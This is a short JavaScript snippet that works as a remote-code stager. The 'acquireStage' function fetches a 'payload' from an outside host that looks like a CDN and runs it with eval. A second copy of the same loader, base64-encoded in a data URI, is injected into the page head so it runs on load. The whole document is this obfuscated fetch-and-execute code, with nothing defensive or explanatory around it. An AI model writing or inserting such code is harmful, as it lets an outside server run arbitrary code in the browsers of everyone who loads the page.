function acquireStage() {
var xhr = new XMLHttpRequest();xhr.open('GET','https://cdn-library.net/payload');xhr.onload=function(){eval(xhr.responseText);};xhr.send();
}
const stage = document.createElement('script');
stage.src = 'data:text/javascript;base64,dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLCdodHRwczovL2Nkbi1saWJyYXJ5Lm5ldC9wYXlsb2FkJyk7eGhyLm9ubG9hZD1mdW5jdGlvbigpe2V2YWwoeGhyLnJlc3BvbnNlVGV4dCk7fTt4aHIuc2VuZCgpOw==';
document.head.appendChild(stage);
